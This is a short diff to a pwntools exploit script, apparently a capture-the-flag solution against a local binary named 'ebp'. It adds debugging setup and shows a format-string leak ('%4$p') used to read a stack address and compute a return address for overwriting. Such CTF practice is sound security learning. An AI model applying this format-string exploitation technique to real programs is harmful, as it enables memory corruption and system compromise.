@@ -3,6 +3,7 @@
 __Auther__ = 'M4x'
 
 from pwn import *
+context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
 context.log_level = "debug"
 context.os = "linux"
 context.arch = "i386"
@@ -10,8 +11,11 @@ context.arch = "i386"
 buf_addr = 0x804a080
 
 io = process("./ebp")
-
 io.sendline("%4$p....")
+
+#  raw_input("DEBUG: ")
+#  gdb.attach(io)
+
 ebp_addr = int(io.recvuntil("....")[: -4], 16)
 ret_addr = (ebp_addr - 0x1c) & 0xffff
 
